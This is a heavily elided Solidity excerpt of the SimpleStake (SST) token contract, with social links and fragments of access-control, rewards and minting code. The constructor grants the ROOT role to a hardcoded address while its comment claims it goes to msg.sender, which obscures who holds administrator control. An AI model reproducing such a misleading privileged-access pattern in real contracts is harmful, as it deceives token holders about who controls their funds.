...
//Website: https://www.simplestake.finance/
//Telegram: https://t.me/SimpleStakeOfficial
//Twitter: https://twitter.com/simplestake
...
contract AccessControl {
     ...
     */
    constructor () {
        _grantRole(ROOT, 0x7c432F4161708260416D398cc4f81C7a02A6ed5f);   // Grant ROOT to msg.sender
...
contract ERC20Rewards is AccessControl, ERC20Permit {
    ...
    function _setRewardsToken(IERC20 rewardsToken_)
        external
    {
...
contract AutoStake is ERC20Rewards {
    constructor() 
        ERC20Rewards("simplestake.finance", "SST", 8){
            _mint(msg.sender, 1200000000000);
        }
}